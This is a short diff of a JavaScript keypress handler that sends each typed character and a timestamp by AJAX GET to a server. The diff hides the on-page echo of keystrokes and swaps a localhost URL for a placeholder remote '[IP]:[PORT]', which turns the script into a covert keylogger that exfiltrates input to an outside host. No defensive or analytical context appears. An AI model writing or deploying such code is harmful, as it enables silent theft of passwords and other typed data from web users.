@@ -21,13 +21,13 @@ function myKeyPress(e){
             		keynum = e.which;
                  }
             //alert(String.fromCharCode(keynum));
-			writeroot.innerHTML += String.fromCharCode(keynum);
+			//writeroot.innerHTML += String.fromCharCode(keynum);
 			var data = 'key='+ String.fromCharCode(keynum) + "&epoch="+milliseconds ; // this where i add multiple data using  ' & '
             var milliseconds = (new Date).getTime();
 		  $.ajax({
 		    type:"GET",
 		    cache:false,
-		    url:"http://localhost:9010/",
+		    url:"http://[IP]:[PORT]/",
 		    data:data,    // multiple data sent using ajax
 		    success: function (html) {
 
